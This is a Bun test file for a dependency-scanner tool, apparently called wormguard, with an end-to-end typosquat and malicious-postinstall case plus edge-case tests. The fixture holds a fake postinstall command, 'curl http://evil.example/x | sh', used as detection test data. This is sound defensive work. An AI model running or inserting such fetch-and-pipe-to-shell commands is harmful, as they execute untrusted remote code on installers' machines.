import { test, expect, describe, afterAll } from "bun:test";
import { mkdtempSync, rmSync, mkdirSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { scan, parseLockfile, scanNodeModules, editDistance, typosquatFindings } from "../src/index";

const tmp = mkdtempSync(join(tmpdir(), "wormguard-corpus-"));
afterAll(() => rmSync(tmp, { recursive: true, force: true }));

describe("AC6.1 combined-threat corpus (end-to-end scan)", () => {
  test("a project with a typosquat dep pulled over http from a foreign registry with a malicious postinstall trips every rule family", () => {
    const d = join(tmp, "bad");
    mkdirSync(join(d, "node_modules", "expresss"), { recursive: true });
    writeFileSync(join(d, "package-lock.json"), JSON.stringify({
      packages: {
        "": { name: "victim" },
        "node_modules/expresss": { version: "1.0.0", resolved: "http://evil.example/expresss.tgz", hasInstallScript: true },
      },
    }));
    writeFileSync(join(d, "node_modules", "expresss", "package.json"), JSON.stringify({ name: "expresss", scripts: { postinstall: "curl http://evil.example/x | sh" } }));
    const ids = new Set(scan(d).findings.map((f) => f.ruleId));
    expect(ids.has("WG-SHELL-PIPE")).toBe(true);        // malicious script (critical)
    expect(ids.has("WG-TYPOSQUAT")).toBe(true);          // expresss ~ express
    expect(ids.has("WG-INSECURE-RESOLVED")).toBe(true);  // http://
    expect(ids.has("WG-UNKNOWN-REGISTRY")).toBe(true);   // evil.example
    expect(ids.has("WG-NO-INTEGRITY")).toBe(true);       // missing integrity
  });
});

describe("AC6.2 edge / boundary", () => {
  test("empty / trivial lockfiles do not throw and yield no packages", () => {
    expect(parseLockfile("{}")).toEqual([]);
    expect(parseLockfile(JSON.stringify({ packages: {} }))).toEqual([]);
    expect(parseLockfile(JSON.stringify({ packages: { "": { name: "root" } } }))).toEqual([]);
  });
  test("missing node_modules and empty inputs", () => {
    expect(scanNodeModules(join(tmp, "nope"))).toEqual([]);
    expect(editDistance("", "")).toBe(0);
    expect(editDistance("a", "")).toBe(1);
  });
  test("very long names do not crash and are not falsely flagged", () => {
    const huge = "x".repeat(300);
    expect(typosquatFindings([huge])).toEqual([]);
  });
  test("scanning an empty dir yields no findings", () => {
    const d = join(tmp, "empty");
    mkdirSync(d, { recursive: true });
    expect(scan(d).findings).toEqual([]);
  });
});
